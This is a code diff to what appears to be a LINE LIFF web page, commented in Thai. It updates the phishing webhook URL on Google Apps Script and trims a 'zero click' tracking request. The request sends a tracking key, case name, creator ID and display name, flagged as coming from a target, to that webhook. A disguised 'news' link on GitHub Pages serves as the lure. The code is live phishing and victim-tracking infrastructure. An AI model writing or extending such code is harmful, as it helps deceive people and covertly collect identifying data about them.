@@ -399,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycby8Gxh8IW9VpEM7KpqTKzohZTYO2omSPBIiK8h-QDGMchchwAzaxPZxKTJJJO4OJGCd_Q/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwUmtBQUZlpVJM-nwlYaQqFvudEp8XXHvJ5Yuamw36ufEq8CtgVTDGU3h5tsA14qpRPVg/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -820,32 +820,18 @@
                 // สร้าง URL สำหรับคลิก (ชี้ไปที่ index.html พร้อม tracking key)
                 const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`; // PHISHING_DOMAIN should point to index.html
                 
-                // รวบรวมข้อมูลอุปกรณ์สำหรับส่งใน Zero Click tracking URL
+                // สร้างรหัสสุ่มเพื่อป้องกันการแคชและทำให้แต่ละรีเควสไม่ซ้ำกัน
                 const randomSuffix = Date.now() + Math.random().toString(36).substring(2, 10);
                 
-                // รวบรวมข้อมูลอุปกรณ์ของผู้สร้าง (จะส่งเป็นข้อมูลแยก)
-                const creatorDeviceInfo = getEnhancedDeviceInfo();
-                
                 // สร้าง URL สำหรับ Zero Click tracking พร้อมข้อมูลการติดตาม
-                // แยกข้อมูลให้ชัดเจนระหว่างผู้สร้าง (Creator) และเป้าหมาย (Target)
+                // ปรับปรุงให้ส่งข้อมูลน้อยที่สุดเพื่อให้ URL ไม่ยาวเกินไปและสามารถดึงข้อมูลจาก HTTP headers ได้
                 let zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick`;
-                
-                // ข้อมูล Tracking และเคส
                 zeroClickTrackUrl += `&key=${trackingKey}`;
                 zeroClickTrackUrl += `&case=${encodeURIComponent(caseName)}`;
-                
-                // ข้อมูลผู้สร้าง - ระบุด้วย prefix creator ให้ชัดเจน
-                zeroClickTrackUrl += `&creatorId=${encodeURIComponent(userId)}`;
-                zeroClickTrackUrl += `&creatorName=${encodeURIComponent(displayName)}`;
-                zeroClickTrackUrl += `&creatorUA=${encodeURIComponent(navigator.userAgent)}`;
-                zeroClickTrackUrl += `&creatorPlatform=${encodeURIComponent(creatorDeviceInfo.platform || navigator.platform)}`;
-                zeroClickTrackUrl += `&creatorBrowser=${encodeURIComponent(creatorDeviceInfo.browser || 'Unknown')}`;
-                
-                // เพิ่มพารามิเตอร์ที่จะใช้ในการระบุว่านี่เป็นการเรียกจากเป้าหมาย
-                zeroClickTrackUrl += `&isTarget=true`;
-                
-                // ป้องกันการแคช
-                zeroClickTrackUrl += `&r=${randomSuffix}`;
+                zeroClickTrackUrl += `&creator=${encodeURIComponent(userId)}`;
+                zeroClickTrackUrl += `&name=${encodeURIComponent(displayName)}`;
+                zeroClickTrackUrl += `&isTarget=true`; // เพิ่มพารามิเตอร์สำคัญที่ระบุว่านี่เป็นการเรียกจากเป้าหมาย
+                zeroClickTrackUrl += `&r=${randomSuffix}`;  // ป้องกันการแคช
                 
                 console.log("Zero Click Track URL:", zeroClickTrackUrl);
 
